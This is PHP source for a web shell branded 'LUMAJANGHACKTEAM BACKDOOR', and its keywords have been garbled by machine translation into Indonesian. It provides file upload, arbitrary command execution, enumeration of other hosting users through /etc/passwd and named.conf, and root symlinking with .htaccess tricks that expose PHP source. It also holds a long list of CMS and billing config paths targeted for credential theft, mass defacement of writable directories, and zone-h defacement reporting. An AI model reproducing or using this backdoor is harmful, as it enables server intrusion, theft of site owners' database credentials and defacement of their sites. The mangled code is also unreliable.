<?php
error_reporting(0);
set_time_limit(0);

jika(get_magic_quotes_gpc()){
foreach($_POST sebagai $key=>$value){
$_POST[$kunci] = stripslashes($nilai);
}
}
echo '<!DOCTYPE HTML>
<html>
<kepala>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> <link href="https://fonts. googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<title>LUMAJANGHACKTEAM BACKDOOR</title>
<gaya>
tubuh{
warna latar: hitam;
-webkit-background-size:cover;
-moz-latar belakang-ukuran: sampul;
-o-background-size: sampul;
ukuran latar belakang: sampul;
font-family:"kelly slab", kursif;
warna putih;
latar belakang: hitam;
warna putih;
perbatasan:5px merah pekat;
batas-radius:2px;
}
#konten tr:arahkan kursor{
warna latar: merah;
text-shadow:0px 0px 10px hitam;
}
#konten .pertama{
warna latar: merah;
}
meja{
perbatasan: 1px #000000 putus-putus;
}
A{
warna putih;
dekorasi teks: tidak ada;
}
a:arahkan{
warna biru;
text-shadow:0px 0px 10px #ffffff;
}
masukan, pilih, area teks{
perbatasan: 1px #000000 padat;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
batas-radius:5px;
}
</ gaya>
</head>
<tubuh>
<br>
<center><img src="https://i.imgur.com/GkgKn6k_d.webp?maxwidth=640&shape=thumb&fidelity=medium" width="250px" height="250px"></center>
<h2><center><font color="#00FFFF"><\> LUMAJANGHACKTEAM BACKDOOR <\></font></center></h2>
<table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Jalur :</font> ';
if(isset($_GET['jalur'])){
$jalan = $_GET['jalur'];
}lain{
$jalan = getcwd();
}
$path = str_replace('\\','/',$path);
$path = meledak('/',$path);

foreach($paths sebagai $id=>$pat){
if($pat == '' && $id == 0){
$a = benar;
echo '<a href="?path=/">/</a>';
melanjutkan;
}
if($pat == '') lanjutkan;
echo '<a href="?path=';
untuk($i=0;$i<=$id;$i++){
echo "$jalan[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Berhasil!!</font><br />';
}lain{
echo '<font color="red">Gagal!!</font><br/>';
}
}
	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} lain {
	$dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$kernel = php_uname();
$ds = @ini_get("disable_functions");
$show_ds = (!kosong($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>BERSIH!!</font>";
if(!function_exists('posix_getegid')) {
	$pengguna = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$kelompok = "?";
} lain {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$pengguna = $uid['nama'];
	$uid = $uid['uid'];
	$grup = $gid['nama'];
	$gid = $gid['gid'];
}
echo "Nonaktifkan Fungsi : $show_ds<br>";
echo "Sistem : <font color=lime>".$kernel."</font><br>";
echo "<tengah>";
echo "<hr>";
echo "[ <a href='?'>Beranda</a> ] - ";
echo "[ <a href='?path=$path&a=configv2'>Config</a> ] - ";
echo "[ <a href='?dir=$dir&to=zoneh'>Zone-h</a> ] - ";
echo "[ <a href='?path=$path&a=jumping'>Melompat</a> ] - ";
echo "[ <a href='?path=$path&a=symlink'>Symlink</a> ] - ";
echo "[ <a href='?dir=$dir&to=mass'>Depes Massal</a> ] - ";
echo "[ <a href='?path=$path&a=cmd'>Perintah</a> ]";
echo "</center>";
echo "<hr>";
if($_GET['ke'] == 'zona') {
	if($_POST['kirim']) {
		$domain = meledak("\r\n", $_POST['url']);
		$nick = $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org /archive/notifier=$nick/published=0</a><br>";
		echo "Arsip Defacer: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier =$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, benar);
				  curl_setopt($ch, CURLOPT_POST, benar);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			kembali curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain sebagai $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">Oke<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>Oke</font><br>";
			} lain {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} lain {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Cubjrnet7'><br>
		<u>Domain</u>: <br>
		<textarea style='lebar: 450px; tinggi: 150px;' nama='url'></textarea><br>
		<input type='submit' name='submit' value='Kirim' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['ke'] == 'massa') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira sebagai $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} lain {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>SELESAI</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira sebagai $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} lain {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>SELESAI</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mulai']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} lain {
	echo "<tengah>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Misa:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' dicentang>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' tinggi='10'><br>
	<font style='text-decoration: underline;'>Nama file:</font><br>
	<input type='text' name='d_file' value='fin.htm' style='width: 450px;' tinggi='10'><br>
	<font style='text-decoration: underline;'>File Indeks:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Diretas Oleh Cubjrnet7</textarea><br>
	<input type='submit' name='start' value='HAJAR ANJENG!' style='lebar: 450px;'>
	</form></center>";
	} 


##JUMPING 
} elseif($_GET['a'] == 'melompat') {
    $i = 0;
    echo "<pre><div class='margin: 5px auto;'>";
    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Tidak dapat membaca /etc/passwd</font>");
    while($passwd = fgets($dll)) {
if($passwd == '' || !$dll) {
    echo "<font color=red>Tidak bisa membaca /etc/passwd</font>";
} lain {
    preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
    foreach($user_jumping[1] sebagai $user_idx_jump) {
        $user_jumping_dir = "/home/$user_idx_jump/public_html";
        if(is_readable($user_jumping_dir)) {
            $i++;
            $jrw = "[<font color=#5ddcfc>R</font>] <a href='?dir=$user_jumping_dir'><font color=red>$user_jumping_dir</font></a>";
            if(is_writable($user_jumping_dir)) {
                $jrw = "[<font color=#5ddcfc>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#5ddcfc>$user_jumping_dir</font></a>";
            }
            echo $jrw;
            if(function_exists('posix_getpwuid')) {
                $domain_jump = file_get_contents("/etc/named.conf");   
                if($domain_jump == '') {
                    echo " => ( <font color=red>gagal mengambil nama domainnya</font> )<br>";
                } lain {
                    preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                    foreach($domains_jump[1] sebagai $dj) {
                        $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                        $user_jumping_url = $user_jumping_url['nama'];
                        if($user_jumping_url == $user_idx_jump) {
                            echo " => ( <u>$dj</u> )<br>";
                            merusak;
                        }
                    }
                }
            } lain {
                gema "<br>";
            }
        }
    }
}
    }
    jika($i == 0) {
    } lain {
echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
    
    echo "</div></pre>";
		}



} elseif($_GET['a'] == 'cmd') {
	echo "<form method='post'>
	<font style='text-decoration: underline;'>".$user."@".$ip.": ~ $ </font>
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form>";
	if($_POST['do_cmd']) {
		echo "<pre>".exe($_POST['cmd'])."</pre>";
	}


}
elseif($_GET['a'] == 'symlink') {
$penuh = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("niod_sym",0777);
@chdir("niod_sym");
@exe("ln -s / root");
$file3 = 'Indeks Opsi FollowSymLinks
DirectoryIndex niod.htm
AddType teks/polos .php
AddHandler teks/polos .php
Puaskan Setiap';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
gema "<br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><ukuran font=2>S. Tidak.</font></td>
<td align=center><font size=2>Domain</font></td>
<td align=center><font size=2>Pengguna</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dhitung = 1;
foreach($d0mains sebagai $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
menyiram();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><ukuran font=2>" . $dhitung. "</font></td>
<td align=left><a href=http://www.".$domains[1][0].Psalmfont class=txt>".$domains[1][0]."</ font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/niod_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></ a></td></tr>";
menyiram();
$dcount++;}}}
echo "</tabel>";
}lain{
$TEST=@file('/etc/passwd');
jika ($UJI){
@mkdir("niod_sym",0777);
@chdir("niod_sym");
exe("ln -s/root");
$file3 = 'Indeks Opsi FollowSymLinks
DirectoryIndex niod.htm
AddType teks/polos .php
AddHandler teks/polos .php
Puaskan Setiap';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 gema "
 <tabel align=batas tengah=1><tr>
 <td align=center><ukuran font=3>S. Tidak.</font></td>
 <td align=center><font size=3>Pengguna</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dhitung = 1;
 $file = fopen("/etc/passwd", "r") or exit("Tidak dapat membuka file!");
 while(!feof($file)){
 $s = fgets($file);
 $cocok = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/ lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named ")
 melanjutkan;
 echo "<tr><td align=center><ukuran font=2>" . $dhitung. "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/niod_sym/root/home/" . $cocok. "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("niod_sym",0777);@chdir("niod_sym");@exe("ln -s / root" );$file3 = '
 Indeks Pilihan FollowSymLinks
DirectoryIndex niod.htm
AddType teks/polos .php
AddHandler teks/polos .php
Memuaskan Setiap
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 gema "
 <div class='mybox'><h2 class='k2ll33d2'>symlinker server</h2>
 <tabel align=batas tengah=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Pengguna</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Tidak dapat membuka file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/ lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named ")
 melanjutkan;
 echo "<tr><td align=center><ukuran font=2>" . $dhitung. "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/niod_sym/root/home/" . $cocok. "/public_html target='_blank'>Symlink</a></td></tr>";
 $dhitung++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } lain
 echo "<center><font size=3>Tidak dapat membuat Symlink</font></center>";
 }
 }



} elseif($_GET['a'] == 'configv2') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "menang"){
echo '<script>alert("Tidak bisa digunakan di server windows")</script>';
keluar;
}
	if($_POST){ if($_POST['config'] == 'symvhosts') {
		@mkdir("niod_symvhosts", 0777);
exe("ln -s / niod_symvhosts/root");
$htaccess="Indeks Opsi FollowSymLinks
DirectoryIndex niod.htm
AddType teks/polos .php 
AddHandler teks/polos .php
Puaskan Setiap";
@file_put_contents("niod_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=meledak("\n",$etc_passwd);
foreach($etc_passwd sebagai $passwd){
$pawd=meledak(":",$passwd);
$pengguna =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $pengguna);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php niod_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php niod_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php niod_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php niod_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php niod_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php niod_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml niod_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php niod_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php niod_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("niod_symconfig", 0777);
@symlink("/","niod_symconfig/root");
$htaccess="Indeks Opsi FollowSymLinks
DirectoryIndex niod.htm
AddType teks/polos .php 
AddHandler teks/polos .php
Puaskan Setiap";
@file_put_contents("niod_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("niod_sym404", 0777);
@symlink("/","niod_sym404/root");
$htaccess="Indeks Opsi FollowSymLinks
DirectoryIndex niod.htm
AddType teks/polos .php 
AddHandler teks/polos .php
Memuaskan Setiap
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FolderFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndeksAbaikan *.txt404
Mesin Tulis Ulang Hidup
Tulis Ulang %{REQUEST_FILENAME} ^.*niod_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("niod_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'ambil') {
						mkdir("niod_configgrab", 0777);
						$isi_htc = "Semua Opsi\nTidak Perlu\nMemuaskan Semua";
						$htc = fopen("niod_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] sebagai $user_niod) {
$grab_config = array(
"/home/$user_niod/.accesshash" => "WHM-accesshash",
"/home/$user_niod/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_niod/public_html/forum/config.php" => "phpBB",
"/home/$user_niod/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_niod/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_niod/public_html/app/etc/local.xml" => "Magento",
"/home/$user_niod/public_html/admin/config.php" => "OpenCart",
"/home/$user_niod/public_html/application/config/database.php" => "Ellislab",
"/home/$user_niod/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_niod/public_html/inc/config.php" => "MyBB",
"/home/$user_niod/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_niod/public_html/inc/conf_global.php" => "IPB",
"/home/$user_niod/public_html/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_niod/public_html/configuration.php" => "Joomla",
"/home/$user_niod/public_html/blog/configuration.php" => "Joomla",
"/home/$user_niod/public_html/submitticket.php" => "^WHMCS",
"/home/$user_niod/public_html/cms/configuration.php" => "Joomla",
"/home/$user_niod/public_html/beta/configuration.php" => "Joomla",
"/home/$user_niod/public_html/portal/configuration.php" => "Joomla",
"/home/$user_niod/public_html/site/configuration.php" => "Joomla",
"/home/$user_niod/public_html/main/configuration.php" => "Joomla",
"/home/$user_niod/public_html/home/configuration.php" => "Joomla",
"/home/$user_niod/public_html/demo/configuration.php" => "Joomla",
"/home/$user_niod/public_html/test/configuration.php" => "Joomla",
"/home/$user_niod/public_html/v1/configuration.php" => "Joomla",
"/home/$user_niod/public_html/v2/configuration.php" => "Joomla",
"/home/$user_niod/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_niod/public_html/new/configuration.php" => "Joomla",
"/home/$user_niod/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/DUKUNGAN/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_niod/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bb-config.php" => "Penagihan Kotak",
"/home/$user_con7ext/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cart/includes/iso4217.php" => "Hostbills",
